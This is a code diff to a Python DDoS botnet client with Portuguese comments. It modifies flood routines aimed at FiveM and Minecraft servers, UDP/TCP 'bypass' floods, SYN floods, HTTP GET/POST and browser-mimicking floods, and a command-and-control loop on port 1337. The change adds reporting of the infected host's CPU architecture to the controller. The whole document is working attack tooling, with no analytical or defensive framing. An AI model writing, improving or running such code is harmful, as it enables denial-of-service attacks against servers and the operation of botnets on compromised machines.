@@ -1,12 +1,8 @@
-import socket
-import threading
-import time
-import os
-import random
+import subprocess, random, random, os, time, threading, socket
 
 # Configuration
 C2_ADDRESS  = ""
-C2_PORT     = 101
+C2_PORT     = 1337
 
 
 # Payload para FiveM (servidores de GTA V)
@@ -19,7 +15,7 @@ payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x2
 payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
 
 
-PACKET_SIZES = [512, 1024, 2048]
+PACKET_SIZES = [1024, 2048]
 
 
 base_user_agents = [
@@ -35,6 +31,13 @@ base_user_agents = [
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
+def get_architecture():
+    try:
+        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
+        return result.decode().strip()
+    except Exception as e:
+        print(f"\nErro ao obter arquitetura: {e}\n")
+        return 'unknown'
 
 def attack_fivem(ip, port, secs):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -72,13 +75,13 @@ def attack_udp_bypass(ip, port, secs):
 
 def attack_tcp_bypass(ip, port, secs):
     """Tenta contornar proteção adicionando pacotes com tamanhos diferentes."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while time.time() < secs:
         packet_size = random.choice(PACKET_SIZES) 
         packet = random._urandom(packet_size)
 
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
             while time.time() < secs:
                 s.send(packet)
@@ -114,7 +117,6 @@ def attack_tcp_udp_bypass(ip, port, secs):
 
 def attack_syn(ip, port, secs):
     """Melhorado para contornar proteções simples de SYN flood com variação de pacotes."""
-
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setblocking(0)
     
@@ -130,8 +132,8 @@ def attack_syn(ip, port, secs):
 
 
 def attack_http_get(ip, port, secs):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             s.connect((ip, port))
             while time.time() < secs:
@@ -141,8 +143,8 @@ def attack_http_get(ip, port, secs):
 
 
 def attack_http_post(ip, port, secs):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             s.connect((ip, port))
             while time.time() < secs:
@@ -160,9 +162,9 @@ def attack_http_post(ip, port, secs):
 
 
 def attack_browser(ip, port, secs):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
         try:
             s.connect((ip, port))
             request = (f'GET / HTTP/1.1\r\n'
@@ -211,7 +213,7 @@ def main():
             while 1:
                 data = c2.recv(1024).decode()
                 if 'Username' in data:
-                    c2.send('BOT'.encode())
+                    c2.send(get_architecture().encode())
                     break
 
             while 1:
